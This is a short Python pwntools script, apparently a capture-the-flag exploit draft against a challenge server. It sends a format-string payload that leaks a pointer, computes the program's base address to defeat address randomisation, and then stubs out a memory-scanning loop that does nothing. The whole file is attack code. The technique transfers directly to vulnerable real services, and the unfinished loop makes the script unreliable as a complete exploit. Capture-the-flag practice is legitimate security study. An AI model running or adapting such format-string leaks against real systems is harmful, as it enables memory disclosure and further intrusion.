from pwn import *

# Set context
context.arch = 'amd64'

def scan_binary():
    r = remote('chals.cyberjousting.com', 1367)
    payload = b'wrong|%39$p'
    r.sendlineafter(b'?', payload)
    r.recvuntil(b'|')
    main_addr = int(r.recvuntil(b'.', drop=True), 16)
    base_addr = main_addr - 0x5c9
    r.close()
    
    print(f"Base address: {hex(base_addr)}")
    
    # Scan from base_addr to base_addr + 0x4000
    for addr in range(base_addr, base_addr + 0x4000, 8):
        # We need to put the address in the buffer.
        # But we can't if it has null bytes.
        # However, we can use the pointer chain to put it on the stack!
        pass

scan_binary()
